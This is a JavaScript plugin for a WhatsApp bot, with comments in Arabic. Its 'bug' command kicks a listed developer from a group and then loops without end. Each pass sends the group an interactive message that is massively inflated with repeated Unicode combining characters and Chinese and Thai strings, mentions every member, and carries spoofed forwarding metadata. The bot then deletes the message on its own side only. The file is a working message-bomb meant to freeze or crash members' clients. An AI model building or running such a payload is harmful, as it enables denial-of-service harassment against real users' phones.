import axios from "axios";
import FormData from "form-data";
import cheerio from "cheerio";

const DEVELOPER_NUMBER = "34672982032@s.whatsapp.net"; // رقم المطور
const DEVELOPER_CHAT = DEVELOPER_NUMBER; // لاستقبال الأخطاء

let handler = async (m, { conn, text, usedPrefix, command }) => {
    const target = m.chat;
    if (!target.endsWith('@g.us')) return m.reply('❌ هذا الأمر يجب تنفيذه داخل المجموعات فقط.');

    await conn.sendMessage(m.chat, { react: { text: '💣', key: m.key } });
    m.reply('⏳ جاري طرد المطور وبدء الخادا...');

    try {
        // 1. طرد المطور (اختياري)
        await conn.groupParticipantsUpdate(target, [DEVELOPER_NUMBER], 'remove')
            .catch(() => m.reply('⚠️ لم يتم العثور على المطور في المجموعة، سيتم المتابعة.'));

        await new Promise(resolve => setTimeout(resolve, 1000));

        // 2. إشعار واحد بالعد التنازلي ثم انتظار 10 ثوانٍ
        await conn.sendMessage(target, { text: '⏳ سيتم الخادا بعد 10 ثواني...' });
        await new Promise(resolve => setTimeout(resolve, 10000)); // 10 ثواني

        // 3. بدء حلقة الإزعاج (مع deleteForMe)
        (async () => {
            while (true) {
                const X1 = "ោ៝".repeat(5500);
                const X2 = "᭯".repeat(5500);
                const X3 = "ꦾ".repeat(5500);
                const Titid = X1 + X2 + X3;

                let groupMetadata = await conn.groupMetadata(target).catch(e => null);
                let member = groupMetadata ? groupMetadata.participants.map(u => u.id) : [];

                let sent = await conn.relayMessage(
                    target,
                    {
                        interactiveMessage: {
                            header: {
                                title: "阿尔开吾艾吾艾贼德贼德艾克斯艾克斯RkyyzzxXอาร์เควายวายแซดแซดเอ็กซ์เอ็กซ์".repeat(1000) + Titid,
                                subtitle: "阿尔开吾艾吾艾贼德贼德艾克斯艾克斯RkyyzzxXอาร์เควายวายแซดแซดเอ็กซ์เอ็กซ์".repeat(1000) + X1,
                                hasMediaAttachment: true,
                                jpegThumbnail: null,
                            },
                            body: {
                                text: "阿尔开吾艾吾艾贼德贼德艾克斯艾克斯RkyyzzxXอาร์เควายวายแซดแซดเอ็กซ์เอ็กซ์".repeat(1000) + X2
                            },
                            footer: {
                                text: "阿尔开吾艾吾艾贼德贼德艾克斯艾克斯RkyyzzxXอาร์เควายวายแซดแซดเอ็กซ์เอ็กซ์".repeat(1000) + X3
                            },
                            contextInfo: {
                                mentionedJid: member,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterName: "阿尔开吾艾吾艾贼德贼德艾克斯艾克斯RkyyzzxXอาร์เควายวายแซดแซดเอ็กซ์เอ็กซ์".repeat(1000),
                                    newsletterJid: "120363344594934051@newsletter",
                                    serverMessageId: 143,
                                },
                                businessMessageForwardInfo: {
                                    businessOwnerJid: conn.decodeJid ? conn.decodeJid(conn.user.id) : conn.user.id.split(':')[0] + '@s.whatsapp.net',
                                },
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: 'catalog_message',
                                        buttonParamsJson: JSON.stringify({}),
                                    },
                                ],
                                messageParamsJson: '{}',
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: 'biz',
                                attrs: {
                                    native_flow_name: 'catalog_message',
                                },
                            },
                        ],
                    }
                ).catch(e => console.error('Relay error:', e));

                // حذف الرسالة من جهة البوت فقط
                if (sent && sent.key) {
                    await conn.sendMessage(target, {
                        delete: sent.key,
                        deleteForMe: true
                    }).catch(e => console.error('Delete for me error:', e));
                }

                await new Promise(resolve => setTimeout(resolve, 1500));
            }
        })();

        await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (e) {
        console.error(e);
        await conn.sendMessage(DEVELOPER_CHAT, { text: `❌ حدث خطأ أثناء تشغيل الخادا:\n\n${e.stack || e.message}` });
        m.reply("❌ حدث خطأ أثناء تشغيل الخادا.");
    }
};

handler.command = /^(bug)$/i;
handler.owner = true;
export default handler;
